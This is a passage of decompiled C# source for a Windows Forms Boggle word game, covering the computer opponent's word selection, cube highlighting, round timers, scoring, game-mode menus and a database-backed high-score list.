          num1 = checked ((int) Math.Round((double) unchecked (Conversion.Int(VBMath.Rnd() * 8f) + 1f)));
          break;
        case modGlobal.Level.Medium:
          num1 = checked ((int) Math.Round((double) unchecked (Conversion.Int(VBMath.Rnd() * 15f) + 1f)));
          break;
        case modGlobal.Level.Hard:
          num1 = checked ((int) Math.Round((double) unchecked (Conversion.Int(VBMath.Rnd() * 30f) + 1f)));
          break;
        case modGlobal.Level.Impossible:
          num1 = checked ((int) Math.Round((double) unchecked (Conversion.Int(VBMath.Rnd() * 5000f) + 1f)));
          break;
      }
      if (this.FoundWords.Rows.Count > num1)
      {
        int num2 = num1;
        int index1 = 0;
        while (index1 <= num2)
        {
          bool flag;
          while (!flag)
          {
            flag = true;
            VBMath.Randomize();
            int index2 = checked ((int) Math.Round((double) unchecked (Conversion.Int(VBMath.Rnd() * (float) this.FoundWords.Rows.Count) + 0.0f)));
            int num3 = Information.UBound((Array) this.WordsChosen);
            int index3 = 0;
            while (index3 <= num3)
            {
              if (ObjectType.ObjTst((object) this.WordsChosen[index3], this.FoundWords.Rows[index2][0], false) == 0)
                flag = false;
              checked { ++index3; }
            }
          }
          this.WordsChosen = (string[]) Utils.CopyArray((Array) this.WordsChosen, (Array) new string[checked (index1 + 1)]);
          this.WordsChosen[index1] = StringType.FromObject(this.FoundWords.Rows[index1][0]);
          flag = false;
          checked { ++index1; }
        }
      }
      else
      {
        int num4 = checked (this.FoundWords.Rows.Count - 1);
        int index = 0;
        while (index <= num4)
        {
          this.WordsChosen = (string[]) Utils.CopyArray((Array) this.WordsChosen, (Array) new string[checked (index + 1)]);
          this.WordsChosen[index] = StringType.FromObject(this.FoundWords.Rows[index][0]);
          checked { ++index; }
        }
      }
      this.lstCompFoundWords.Refresh();
      if (StringType.StrCmp(sLeft, "", false) == 0)
        sLeft = "\r\nComputer: I found " + StringType.FromInteger(Information.UBound((Array) this.WordsChosen)) + " words!";
      this.txtMain.Text += sLeft;
      this.mnuEndGame.Enabled = true;
      this.btnFinish.BogButtonEnabled = true;
    }

    private void ShowWord()
    {
      try
      {
        foreach (Cube cube in (CollectionBase) modGlobal.Cubes)
        {
          modGlobal.myCube = cube;
          modGlobal.myCube.CubeHighLight = System.Drawing.Color.LightGray;
          modGlobal.myCube.CubeTextColor = System.Drawing.Color.DarkBlue;
          modGlobal.myCube.CubeDownPic = (PictureBox) null;
        }
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          ((IDisposable) enumerator).Dispose();
      }
      string str;
      try
      {
        foreach (DataRow row in (InternalDataCollectionBase) this.FoundWords.Rows)
        {
          if (ObjectType.ObjTst(row["FoundWord"], (object) modGlobal.Cubes.WordToShow, false) == 0)
          {
            str = StringType.FromObject(row["FoundWordSquares"]);
            break;
          }
        }
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          ((IDisposable) enumerator).Dispose();
      }
      int num1 = Strings.Len(modGlobal.Cubes.WordToShow);
      if (Strings.InStr(Strings.UCase(modGlobal.Cubes.WordToShow), "Q") != 0)
        num1 = checked (Strings.Len(modGlobal.Cubes.WordToShow) - 1);
      int num2 = num1;
      int num3 = 1;
      while (num3 <= num2)
      {
        int Index;
        if (Strings.InStr(str, ",") == 0)
        {
          Index = IntegerType.FromString(str);
        }
        else
        {
          Index = IntegerType.FromString(Strings.Mid(str, 1, checked (Strings.InStr(str, ",") - 1)));
          str = Strings.Mid(str, checked (Strings.InStr(str, ",") + 1));
        }
        modGlobal.Cubes[Index].CubeHighLight = System.Drawing.Color.Aquamarine;
        modGlobal.Cubes[Index].CubeTextColor = System.Drawing.Color.Red;
        this.ResetCubes();
        try
        {
          foreach (Cube cube in (CollectionBase) modGlobal.Cubes)
          {
            modGlobal.myCube = cube;
            modGlobal.myCube.CubeDownPic = (PictureBox) null;
          }
        }
        finally
        {
          IEnumerator enumerator;
          if (enumerator is IDisposable)
            ((IDisposable) enumerator).Dispose();
        }
        modGlobal.Cubes[Index].CubeDownPic = this.picCubeDown;
        modGlobal.Cubes[Index].ShowClick();
        Thread.Sleep(100);
        checked { ++num3; }
      }
      this.ResetCubes();
      modGlobal.Cubes.WordToShow = "";
    }

    private void picCubesUp_Paint(object sender, PaintEventArgs e) => modGlobal.Cubes.DrawCubes(e, modGlobal.Cubes.CubesState);

    private void btnAddWord_Click(object sender, EventArgs e)
    {
      if (Strings.Len(Strings.Trim(this.txtWordFound.Text)) > 2)
      {
        this.lstHumanWordsFound.Items.Add((object) this.txtWordFound.Text);
        this.lblHumanWordsCount.Text = StringType.FromInteger(this.lstHumanWordsFound.Items.Count);
        this.txtWordFound.Text = "";
      }
      this.txtWordFound.Focus();
    }

    private void ShowText()
    {
      int num1;
      int num2;
      if (modGlobal.Cubes.DisplayTextFadeOut)
      {
        num1 = modGlobal.Cubes.DisplayTextMaxSize;
        int num3 = checked (modGlobal.Cubes.DisplayTextMaxSize + 100);
        num2 = checked ((int) Math.Round(unchecked ((double) num1 / 2.0)));
      }
      else
      {
        num1 = checked ((int) Math.Round(unchecked ((double) modGlobal.Cubes.DisplayTextMaxSize / 2.0)));
        num2 = checked (num1 + 100);
      }
      modGlobal.Cubes.CubesState = CubesCollection.StateOfCubes.Text;
      int num4 = num1;
      int num5 = 1;
      while (num5 <= num4)
      {
        this.Show();
        if (num5 == num2)
          Thread.Sleep(1000);
        this.picCubesUp.Refresh();
        checked { ++num5; }
      }
      if (modGlobal.Cubes.DisplayTextFadeOut)
      {
        modGlobal.Cubes.DisplayText = "";
        this.picCubesUp.Refresh();
      }
      if (modGlobal.Cubes.DisplayTextStartUp)
      {
        modGlobal.Cubes.ShowSpinStartUp();
        while (modGlobal.Cubes.CubesAreSpinning)
          Application.DoEvents();
        this.btnScramble.BogButtonEnabled = true;
        this.txtMain.Text = "5 seconds to re-scramble letters";
      }
      this.ShowTextThread.Suspend();
    }

    private void txtWordFound_KeyPress(object sender, KeyPressEventArgs e)
    {
      if (!(StringType.StrCmp(Strings.Mid(StringType.FromChar(e.KeyChar), 1, 3), "\r", false) == 0 & this.btnAddWord.BogButtonEnabled))
        return;
      this.btnAddWord_Click((object) this, new EventArgs());
    }

    private void tmrContMain_Tick(object sender, EventArgs e)
    {
      checked { ++this.\u0024STATIC\u0024tmrContMain_Tick\u002420211C1211\u0024LoadWaitTime; }
      if (!this.LoadTextShown & this.\u0024STATIC\u0024tmrContMain_Tick\u002420211C1211\u0024LoadWaitTime == 5)
      {
        this.LoadTextShown = true;
        this.ShowDisplayText("Welcome\r\n      to\r\n  Boggle", false, false, 160);
        this.tmrContMain.Enabled = false;
        this.mnuGame.Enabled = true;
        this.mnuOptions.Enabled = true;
        this.mnuHelp.Enabled = true;
        OleDbCommand oleDbCommand = new OleDbCommand("Select ShowForm From ShowWelcome", modGlobal.conBoggle);
        modGlobal.conBoggle.Open();
        OleDbDataReader oleDbDataReader = oleDbCommand.ExecuteReader();
        oleDbDataReader.Read();
        if (ObjectType.ObjTst(oleDbDataReader["ShowForm"], (object) 0, false) == 0)
          new frmWelcome().Show();
        oleDbDataReader.Close();
        modGlobal.conBoggle.Close();
      }
      else
      {
        if (!this.LoadTextShown)
          return;
        if (Strings.InStr(Strings.UCase(this.txtMain.Text), "RE-SCRAMBLING") != 0)
        {
          this.ScramSec = 5.0;
          this.txtMain.Text = "5 seconds to re-scramble letters";
        }
        else if (Strings.InStr(Strings.UCase(this.txtMain.Text), "RE-SCRAMBLE") != 0)
        {
          if (this.ScramSec % 1.0 == 0.0)
            this.txtMain.Text = StringType.FromDouble(this.ScramSec) + " seconds to re-scramble letters";
          this.ScramSec -= 0.5;
          if (this.ScramSec != 0.0)
            return;
          this.btnScramble.BogButtonEnabled = false;
          this.btnContinue.BogButtonEnabled = false;
          this.txtMain.Text = "";
          this.ScramSec = 5.0;
          string str = this.StartLevel(false);
          this.Min = IntegerType.FromString(Strings.Mid(str, 1, 1));
          this.Sec = DoubleType.FromString(Strings.Mid(str, 2));
          this.\u0024STATIC\u0024tmrContMain_Tick\u002420211C1211\u0024TimerGoing = true;
        }
        else if (this.\u0024STATIC\u0024tmrContMain_Tick\u002420211C1211\u0024TimerGoing)
        {
          this.Sec -= 0.5;
          if (this.Sec < 0.0)
          {
            if (this.Min == 0)
            {
              this.\u0024STATIC\u0024tmrContMain_Tick\u002420211C1211\u0024TimerGoing = false;
              this.btnScramble.BogButtonEnabled = false;
              this.Sec = 60.0;
              this.Min = 2;
              this.EndLevel();
              return;
            }
            checked { --this.Min; }
            this.Sec = 59.0;
          }
          string str = StringType.FromDouble(this.Sec);
          if (this.Sec < 10.0)
            str = "0" + StringType.FromDouble(this.Sec);
          if (this.Sec % 1.0 == 0.0)
            this.tmrMain.TimerText = StringType.FromInteger(this.Min) + str;
        }
      }
    }

    private void tmrBtn1_Click(object sender, EventArgs e)
    {
      object o1 = LateBinding.LateGet(sender, (System.Type) null, "name", new object[0], (string[]) null, (bool[]) null);
      if (ObjectType.ObjTst(o1, (object) "tmrBtn1", false) == 0)
      {
        this.tmrMain.LedBackColor = System.Drawing.Color.Black;
        this.tmrMain.LedOffColor = System.Drawing.Color.FromArgb(0, 70, 0);
        this.tmrMain.LedOnColor = System.Drawing.Color.LawnGreen;
      }
      else if (ObjectType.ObjTst(o1, (object) "tmrBtn2", false) == 0)
      {
        this.tmrMain.LedBackColor = System.Drawing.Color.Black;
        this.tmrMain.LedOffColor = System.Drawing.Color.FromArgb(0, 0, 70);
        this.tmrMain.LedOnColor = System.Drawing.Color.DeepSkyBlue;
      }
      else if (ObjectType.ObjTst(o1, (object) "tmrBtn3", false) == 0)
      {
        this.tmrMain.LedBackColor = System.Drawing.Color.Aquamarine;
        this.tmrMain.LedOffColor = System.Drawing.Color.LightCyan;
        this.tmrMain.LedOnColor = System.Drawing.Color.Teal;
      }
      else if (ObjectType.ObjTst(o1, (object) "tmrBtn4", false) == 0)
      {
        this.tmrMain.LedBackColor = System.Drawing.Color.Black;
        this.tmrMain.LedOffColor = System.Drawing.Color.FromArgb(70, 0, 0);
        this.tmrMain.LedOnColor = System.Drawing.Color.Red;
      }
      this.btnAddWord.Focus();
    }

    private void ShowDisplayText(
      string Text,
      bool FadeOut,
      bool StartUp,
      int MaxSize,
      int PositionOffSet = 0)
    {
      try
      {
        foreach (Cube cube in (CollectionBase) modGlobal.Cubes)
        {
          modGlobal.myCube = cube;
          modGlobal.myCube.CubeLabel.Visible = false;
        }
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          ((IDisposable) enumerator).Dispose();
      }
      if (StringType.StrCmp(modGlobal.Cubes.DisplayText, "", false) != 0)
        this.ShowTextThread.Suspend();
      this.ShowTextThread = new Thread(new ThreadStart(this.ShowText));
      modGlobal.Cubes.DisplayTextFadeOut = FadeOut;
      modGlobal.Cubes.DisplayTextStartUp = StartUp;
      modGlobal.Cubes.DisplayTextMaxSize = MaxSize;
      modGlobal.Cubes.DisplayPosition = PositionOffSet;
      modGlobal.Cubes.DisplayText = Text;
      modGlobal.Cubes.CubesState = CubesCollection.StateOfCubes.Clear;
      this.picCubesUp.Refresh();
      this.ShowTextThread.Start();
    }

    private void mnuNewGame_Click(object sender, EventArgs e)
    {
      if (this.ShowTextThread.ThreadState == System.Threading.ThreadState.Running)
        this.ShowTextThread.Suspend();
      this.LoadTextShown = true;
      this.mnuEndGame.Enabled = true;
      this.mnuNewGame.Enabled = false;
      this.mnuOptions.Enabled = false;
      this.picCubeDown.Visible = false;
      try
      {
        foreach (Cube cube in (CollectionBase) modGlobal.Cubes)
        {
          modGlobal.myCube = cube;
          modGlobal.myCube.CubeHighLight = System.Drawing.Color.LightGray;
          modGlobal.myCube.CubeTextColor = System.Drawing.Color.DarkBlue;
          modGlobal.myCube.CubeDownPic = (PictureBox) null;
        }
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          ((IDisposable) enumerator).Dispose();
      }
      this.txtMain.Text = "";
      this.tmrContMain.Enabled = false;
      this.lstCompFoundWords.Items.Clear();
      this.lstHumanWordsFound.Items.Clear();
      this.ShowDisplayText("  Get\r\nReady!", true, true, 180);
      this.StartLevel(true);
      while (this.ShowTextThread.ThreadState != System.Threading.ThreadState.Suspended)
        Application.DoEvents();
      this.txtWordFound.Focus();
      this.tmrContMain.Enabled = true;
    }

    private string StartLevel(bool JustObj)
    {
      string str1;
      bool flag;
      switch (modGlobal.GameMode)
      {
        case modGlobal.Mode.Vs:
          str1 = "Try to find more words than me before time runs out.\r\nGood luck, your gonna need it!";
          flag = true;
          break;
        case modGlobal.Mode.BoardGame:
          str1 = "Players: find as many words as you can before time runs out. Good luck!";
          flag = false;
          break;
      }
      this.lblHumanWordsCount.Text = "0";
      this.lblCompWordsCount.Text = "0";
      this.txtMain.Text = str1;
      this.tmrMain.TimerText = Strings.Replace(Strings.Mid(modGlobal.TimerInterval.ToString(), 3), "c", "");
      string str2;
      if (!JustObj)
      {
        checked { ++this.Round; }
        this.lblRound.Text = StringType.FromInteger(this.Round);
        this.txtMain.Text += "\r\nComputer: Finding Words...";
        this.FindWordsThread = new Thread(new ThreadStart(this.FindAllWords));
        this.FindWordsThread.Start();
        this.btnAddWord.BogButtonEnabled = flag;
        str2 = Strings.Replace(Strings.Mid(modGlobal.TimerInterval.ToString(), 3), "c", "");
      }
      return str2;
    }

    private void EndLevel()
    {
      int num1 = Information.UBound((Array) this.WordsChosen);
      int index1 = 0;
      while (index1 <= num1)
      {
        this.lstCompFoundWords.Items.Add((object) this.WordsChosen[index1]);
        this.lblCompWordsCount.Text = StringType.FromInteger(this.lstCompFoundWords.Items.Count);
        checked { ++index1; }
      }
      this.btnContinue.BogButtonEnabled = true;
      this.txtWordFound.Text = "";
      int num2;
      switch (modGlobal.GameMode)
      {
        case modGlobal.Mode.Vs:
          num2 = -1;
          this.btnAddWord.BogButtonEnabled = false;
          break;
        case modGlobal.Mode.BoardGame:
          this.txtMain.Text = "Time is up! Tally up your points!\r\n\r\nClick \"Continue\" To Re-Start!";
          return;
      }
      if (this.lstHumanWordsFound.Items.Count < num2)
      {
        this.txtMain.Text = "Sorry, you did not find " + StringType.FromInteger(num2) + " words.\r\nGame over...\r\nTry again!!";
        this.ShowDisplayText("GAME\r\nOVER", false, false, 180);
      }
      else
      {
        int num3 = checked (this.lstHumanWordsFound.Items.Count - 1);
        int index2 = 0;
        int num4;
        string str1;
        while (index2 <= num3)
        {
          bool flag = true;
          int num5 = checked (this.lstCompFoundWords.Items.Count - 1);
          int index3 = 0;
          while (index3 <= num5)
          {
            if (ObjectType.ObjTst(this.lstHumanWordsFound.Items[index2], this.lstCompFoundWords.Items[index3], false) == 0)
              flag = false;
            checked { ++index3; }
          }
          if (flag)
          {
            checked { ++num4; }
            str1 = StringType.StrCmp(str1, "", false) != 0 ? StringType.FromObject(ObjectType.StrCatObj((object) str1, ObjectType.StrCatObj((object) ",", this.lstHumanWordsFound.Items[index2]))) : StringType.FromObject(ObjectType.StrCatObj((object) str1, this.lstHumanWordsFound.Items[index2]));
          }
          checked { ++index2; }
        }
        string str2 = Strings.Replace(str1, "\r\n", "");
        if (this.mnuEnableWordValidation.Checked & StringType.StrCmp(str2, (string) null, false) != 0)
        {
          this.txtMain.Text = "Validating Your Words...";
          Application.DoEvents();
          string str3 = modFindWords.ValidateWords(str2);
          if (StringType.StrCmp(str3, (string) null, false) != 0)
          {
            int num6 = (int) MessageBox.Show("You have entered words that are impossible to make from the current letter configuration.\r\nThese words will be removed from the score calculation and excluded from your unique word list.\r\n\r\nInvalid words:    " + Strings.Mid(str3, 1, checked (Strings.Len(str3) - 1)), "Impossible Words Found", MessageBoxButtons.OK);
            while (StringType.StrCmp(str3, "", false) != 0)
            {
              checked { --num4; }
              string Find = Strings.Mid(str3, 1, checked (Strings.InStr(str3, ",") - 1));
              str3 = Strings.Mid(str3, checked (Strings.InStr(str3, ",") + 1));
              str2 = Strings.Replace(Strings.Replace(str2, Find + ",", ""), Find, "");
            }
          }
        }
        int num7 = this.ScoreWords(str2);
        int num8 = num7;
        checked { this.HumanScore += num7; }
        this.lblHumanScore.Text = StringType.FromDouble(Conversion.Val(this.lblHumanScore.Text) + (double) num7);
        this.txtMain.Text = "Your unique words:  " + str2;
        RichTextBox txtMain1 = this.txtMain;
        txtMain1.Text = txtMain1.Text + "\r\nYou found " + StringType.FromInteger(this.lstHumanWordsFound.Items.Count) + " total words.";
        RichTextBox txtMain2 = this.txtMain;
        txtMain2.Text = txtMain2.Text + "\r\nYou found " + StringType.FromInteger(num4) + " unique words.";
        string str4 = "";
        int num9 = 0;
        int num10 = checked (this.lstCompFoundWords.Items.Count - 1);
        int index4 = 0;
        while (index4 <= num10)
        {
          bool flag = true;
          int num11 = checked (this.lstHumanWordsFound.Items.Count - 1);
          int index5 = 0;
          while (index5 <= num11)
          {
            if (ObjectType.ObjTst(this.lstCompFoundWords.Items[index4], this.lstHumanWordsFound.Items[index5], false) == 0)
              flag = false;
            checked { ++index5; }
          }
          if (flag)
          {
            checked { ++num9; }
            str4 = StringType.StrCmp(str4, "", false) != 0 ? StringType.FromObject(ObjectType.StrCatObj((object) str4, ObjectType.StrCatObj((object) ",", this.lstCompFoundWords.Items[index4]))) : StringType.FromObject(ObjectType.StrCatObj((object) str4, this.lstCompFoundWords.Items[index4]));
          }
          checked { ++index4; }
        }
        string Words = Strings.Replace(str4, "\r\n", "");
        RichTextBox txtMain3 = this.txtMain;
        txtMain3.Text = txtMain3.Text + "\r\nMy unique words: " + Words;
        RichTextBox txtMain4 = this.txtMain;
        txtMain4.Text = txtMain4.Text + "\r\nI found " + StringType.FromInteger(this.lstCompFoundWords.Items.Count) + "  total words.";
        RichTextBox txtMain5 = this.txtMain;
        txtMain5.Text = txtMain5.Text + "\r\nI found " + StringType.FromInteger(num9) + " unique words.";
        int num12 = this.ScoreWords(Words);
        int num13 = num12;
        checked { this.ComputerScore += num12; }
        this.lblCompScore.Text = StringType.FromDouble(Conversion.Val(this.lblCompScore.Text) + (double) num12);
        if (num13 > num8)
        {
          this.lblComputerRounds.Text = StringType.FromDouble(Conversion.Val(this.lblComputerRounds.Text) + 1.0);
          checked { ++this.ComputerRounds; }
        }
        else
        {
          this.lblHumanRounds.Text = StringType.FromDouble(Conversion.Val(this.lblHumanRounds.Text) + 1.0);
          checked { ++this.HumanRounds; }
        }
      }
    }

    public int ScoreWords(string Words)
    {
      if (Strings.Len(Words) == 0)
        return 0;
      Words += ",";
      int num;
      while (StringType.StrCmp(Words, "", false) != 0)
      {
        string Expression = Strings.Mid(Words, 1, checked (Strings.InStr(Words, ",") - 1));
        Words = Strings.Mid(Words, checked (Strings.InStr(Words, ",") + 1));
        switch (Strings.Len(Expression))
        {
          case 3:
            checked { ++num; }
            break;
          case 4:
            checked { num += 2; }
            break;
          case 5:
            checked { num += 3; }
            break;
          default:
            checked { num += 4; }
            break;
        }
      }
      return num;
    }

    private void tmrBtn1_Click_1(object sender, EventArgs e)
    {
      string timerText = this.tmrMain.TimerText;
      object o1 = LateBinding.LateGet(sender, (System.Type) null, "name", new object[0], (string[]) null, (bool[]) null);
      if (ObjectType.ObjTst(o1, (object) "tmrBtn1", false) == 0)
      {
        this.tmrMain.LedBackColor = System.Drawing.Color.Black;
        this.tmrMain.LedOffColor = System.Drawing.Color.FromArgb(0, 70, 0);
        this.tmrMain.LedOnColor = System.Drawing.Color.LawnGreen;
      }
      else if (ObjectType.ObjTst(o1, (object) "tmrBtn2", false) == 0)
      {
        this.tmrMain.LedBackColor = System.Drawing.Color.Black;
        this.tmrMain.LedOffColor = System.Drawing.Color.FromArgb(0, 0, 70);
        this.tmrMain.LedOnColor = System.Drawing.Color.DeepSkyBlue;
      }
      else if (ObjectType.ObjTst(o1, (object) "tmrBtn3", false) == 0)
      {
        this.tmrMain.LedBackColor = System.Drawing.Color.Aquamarine;
        this.tmrMain.LedOffColor = System.Drawing.Color.LightCyan;
        this.tmrMain.LedOnColor = System.Drawing.Color.Teal;
      }
      else if (ObjectType.ObjTst(o1, (object) "tmrBtn4", false) == 0)
      {
        this.tmrMain.LedBackColor = System.Drawing.Color.Black;
        this.tmrMain.LedOffColor = System.Drawing.Color.FromArgb(70, 0, 0);
        this.tmrMain.LedOnColor = System.Drawing.Color.Red;
      }
      this.tmrMain.TimerText = timerText;
      this.btnAddWord.Focus();
    }

    private void lstCompFoundWords_MouseUp(object sender, MouseEventArgs e)
    {
      if (StringType.StrCmp(modGlobal.Cubes.WordToShow, "", false) != 0)
        this.ShowWordThread.Abort();
      modGlobal.Cubes.WordToShow = this.lstCompFoundWords.GetItemText(RuntimeHelpers.GetObjectValue(this.lstCompFoundWords.SelectedItem));
      this.ShowWordThread = new Thread(new ThreadStart(this.ShowWord));
      this.ShowWordThread.Start();
      if (!this.mnuEnableDefSearch.Checked)
        return;
      while (this.ShowWordThread.ThreadState == System.Threading.ThreadState.Running)
        Application.DoEvents();
      this.txtMain.Text = "Querying Defenition...";
      Application.DoEvents();
      this.txtMain.Text = modFindWords.GetDef(this.lstCompFoundWords.GetItemText(RuntimeHelpers.GetObjectValue(this.lstCompFoundWords.SelectedItem)));
      this.txtMain.SelectionStart = 0;
    }

    private void ChangeMode(object sender, EventArgs e)
    {
      this.txtMain.Text = "";
      object o1 = LateBinding.LateGet(sender, (System.Type) null, "text", new object[0], (string[]) null, (bool[]) null);
      if (ObjectType.ObjTst(o1, (object) "Board Game Mode", false) == 0)
      {
        modGlobal.GameMode = modGlobal.Mode.BoardGame;
        this.txtMain.Text = "---Board Game Mode---";
      }
      else if (ObjectType.ObjTst(o1, (object) "Vs. Computer Mode", false) == 0)
      {
        modGlobal.GameMode = modGlobal.Mode.Vs;
        this.txtMain.Text = "---Vs. Computer Mode---";
      }
      else if (ObjectType.ObjTst(o1, (object) "Teaching Mode", false) == 0)
      {
        int num = (int) MessageBox.Show("Teaching mode is not available on the PSC version of Boggle .Net. Sorry!", "Teaching Mode", MessageBoxButtons.OK);
        modGlobal.GameMode = modGlobal.Mode.Vs;
        this.txtMain.Text = "---Vs. Computer Mode---";
      }
      this.txtMain.Text += "\r\n\r\nClick \"Game\" - \"New Game\" To Start!";
      this.mnuNewGame.Enabled = true;
      this.mnuEndGame.Enabled = false;
      this.mnuBoardGameMode.Checked = false;
      this.mnuVsMode.Checked = false;
      this.mnuTeachingMode.Checked = false;
      LateBinding.LateSet(sender, (System.Type) null, "checked", new object[1]
      {
        (object) true
      }, (string[]) null);
    }

    private void ChangeLevel(object sender, EventArgs e)
    {
      object o1 = LateBinding.LateGet(sender, (System.Type) null, "text", new object[0], (string[]) null, (bool[]) null);
      if (ObjectType.ObjTst(o1, (object) "Level Easy", false) == 0)
        modGlobal.GameLevel = modGlobal.Level.Easy;
      else if (ObjectType.ObjTst(o1, (object) "Level Medium", false) == 0)
        modGlobal.GameLevel = modGlobal.Level.Medium;
      else if (ObjectType.ObjTst(o1, (object) "Level Hard", false) == 0)
        modGlobal.GameLevel = modGlobal.Level.Hard;
      else if (ObjectType.ObjTst(o1, (object) "Level Impossible to win", false) == 0)
        modGlobal.GameLevel = modGlobal.Level.Impossible;
      this.mnuLevelEasy.Checked = false;
      this.mnuLevelMedium.Checked = false;
      this.mnuLevelHard.Checked = false;
      this.mnuLevelImpossible.Checked = false;
      this.Round = 0;
      this.lblRound.Text = StringType.FromInteger(0);
      LateBinding.LateSet(sender, (System.Type) null, "checked", new object[1]
      {
        (object) true
      }, (string[]) null);
    }

    private void CheckHighScores()
    {
      OleDbCommand oleDbCommand = new OleDbCommand("Select Count(*) as C From HighScores", modGlobal.conBoggle);
      modGlobal.conBoggle.Open();
      int num1 = IntegerType.FromObject(oleDbCommand.ExecuteScalar());
      modGlobal.conBoggle.Close();
      if (num1 != 0)
      {
        oleDbCommand.CommandText = "Select Min(Rounds) as R From HighScores";
        modGlobal.conBoggle.Open();
        num1 = IntegerType.FromObject(oleDbCommand.ExecuteScalar());
        modGlobal.conBoggle.Close();
      }
      if (this.HumanRounds <= num1)
        return;
      string str1;
      switch (modGlobal.GameLevel)
      {
        case modGlobal.Level.Easy:
          str1 = "Easy";
          break;
        case modGlobal.Level.Medium:
          str1 = "Medium";
          break;
        case modGlobal.Level.Hard:
          str1 = "Hard";
          break;
        case modGlobal.Level.Impossible:
          str1 = "Impossible";
          break;
      }
      string str2 = Interaction.InputBox("Congradulations!\r\nYou have made the Boggle .Net high score list!\r\nEnter your name (5 Char Max).", "New High Score");
      if (StringType.StrCmp(str2, "", false) == 0 | Strings.Len(str2) > 5)
        str2 = "Lazy";
      oleDbCommand.CommandText = "Select Count(*) as C From HighScores";
      modGlobal.conBoggle.Open();
      int num2 = IntegerType.FromObject(oleDbCommand.ExecuteScalar());
      modGlobal.conBoggle.Close();
      if (num2 >= 10)
      {
        oleDbCommand.CommandText = "Delete From HighScores Where Rounds = " + StringType.FromInteger(num1);
        modGlobal.conBoggle.Open();
        oleDbCommand.ExecuteNonQuery();
        modGlobal.conBoggle.Close();
      }
      oleDbCommand.CommandText = "Insert Into HighScores (Name,[Level],Rounds,Score) Values ('" + Strings.UCase(str2) + "','" + str1 + "'," + StringType.FromInteger(this.HumanRounds) + "," + StringType.FromInteger(this.HumanScore) + ")";
      modGlobal.conBoggle.Open();
      oleDbCommand.ExecuteNonQuery();
      modGlobal.conBoggle.Close();
    }

    private void mnuEndGame_Click(object sender, EventArgs e)
    {
      if (this.ShowTextThread.ThreadState == System.Threading.ThreadState.Running)
        this.ShowTextThread.Suspend();
      if (this.ShowWordThread.ThreadState == System.Threading.ThreadState.Running)
        this.ShowWordThread.Suspend();
      this.tmrContMain.Enabled = false;
      this.tmrMain.TimerText = "000";
      this.ScramSec = 5.0;
      this.btnAddWord.BogButtonEnabled = false;
      this.btnScramble.BogButtonEnabled = false;
      this.btnFinish.BogButtonEnabled = false;
      if (ObjectType.ObjTst(LateBinding.LateGet(sender, (System.Type) null, "text", new object[0], (string[]) null, (bool[]) null), (object) "Continue", false) != 0)
      {
        this.Round = 0;
        this.lblRound.Text = StringType.FromInteger(0);
        this.lblCompScore.Text = StringType.FromInteger(0);
        this.lblHumanScore.Text = StringType.FromInteger(0);
        this.lblHumanRounds.Text = StringType.FromInteger(0);
        this.lblComputerRounds.Text = StringType.FromInteger(0);
        this.mnuOptions.Enabled = true;
        this.CheckHighScores();
      }
      modGlobal.Cubes.KillCubeThreads();
      modGlobal.Cubes.CubesState = CubesCollection.StateOfCubes.Clear;
      this.picCubesUp.Refresh();
      this.ShowDisplayText(" Game\r\nEnded!!", false, false, 180);
      switch (modGlobal.GameMode)
      {
        case modGlobal.Mode.Vs:
          this.ChangeMode((object) this.mnuVsMode, new EventArgs());
          break;
        case modGlobal.Mode.BoardGame:
          this.ChangeMode((object) this.mnuBoardGameMode, new EventArgs());
          break;
        case modGlobal.Mode.Teaching:
          this.ChangeMode((object) this.mnuTeachingMode, new EventArgs());
          break;
      }
    }

    private void mnuEnableDefSearch_Click(object sender, EventArgs e)
    {
      this.mnuEnableDefSearch.Checked = !this.mnuEnableDefSearch.Checked;
      if (!this.mnuEnableDefSearch.Checked)
        return;
      int num = (int) MessageBox.Show("Defenition search is enabled. You must be connected to the internet in order for this feature to function properly.", "Defenition Search Enabled", MessageBoxButtons.OK);
    }

    private void ChangeTimerInterval(object sender, EventArgs e)
    {
      object o1 = LateBinding.LateGet(sender, (System.Type) null, "text", new object[0], (string[]) null, (bool[]) null);
      if (ObjectType.ObjTst(o1, (object) ":30", false) == 0)
        modGlobal.TimerInterval = modGlobal.Interval.Sec030;
      else if (ObjectType.ObjTst(o1, (object) "1:00", false) == 0)
        modGlobal.TimerInterval = modGlobal.Interval.Sec100;
      else if (ObjectType.ObjTst(o1, (object) "1:30", false) == 0)
        modGlobal.TimerInterval = modGlobal.Interval.Sec130;
      else if (ObjectType.ObjTst(o1, (object) "2:00", false) == 0)
        modGlobal.TimerInterval = modGlobal.Interval.Sec200;
      else if (ObjectType.ObjTst(o1, (object) "2:30", false) == 0)
        modGlobal.TimerInterval = modGlobal.Interval.Sec230;
      else if (ObjectType.ObjTst(o1, (object) "3:00", false) == 0)
        modGlobal.TimerInterval = modGlobal.Interval.Sec300;
      else if (ObjectType.ObjTst(o1, (object) "3:30", false) == 0)
        modGlobal.TimerInterval = modGlobal.Interval.Sec330;
      else if (ObjectType.ObjTst(o1, (object) "4:00", false) == 0)
        modGlobal.TimerInterval = modGlobal.Interval.Sec400;
      else if (ObjectType.ObjTst(o1, (object) "4:30", false) == 0)
        modGlobal.TimerInterval = modGlobal.Interval.Sec430;
      else if (ObjectType.ObjTst(o1, (object) "5:00", false) == 0)
        modGlobal.TimerInterval = modGlobal.Interval.Sec500;
      this.mnuTmr30.Checked = false;
      this.mnuTmr100.Checked = false;
      this.mnuTmr130.Checked = false;
      this.mnuTmr200.Checked = false;
      this.mnuTmr230.Checked = false;
      this.mnuTmr300.Checked = false;
      this.mnuTmr330.Checked = false;
      this.mnuTmr400.Checked = false;
      this.mnuTmr430.Checked = false;
      this.mnuTmr500.Checked = false;
      LateBinding.LateSet(sender, (System.Type) null, "checked", new object[1]
      {
        (object) true
      }, (string[]) null);
    }

    private void mnuEnableTimerFlash_Click(object sender, EventArgs e)
    {
      this.mnuEnableTimerFlash.Checked = !this.mnuEnableTimerFlash.Checked;
      if (this.mnuEnableTimerFlash.Checked)
        this.tmrMain.EnableFlash = true;
      else
        this.tmrMain.EnableFlash = false;
    }

    private void mnuExitGame_Click(object sender, EventArgs e)
    {
      this.mnuEndGame_Click((object) this.mnuEndGame, new EventArgs());
      this.Dispose();
      ProjectData.EndApp();
    }

    private void btnContinue_Click_1(object sender, EventArgs e)
    {
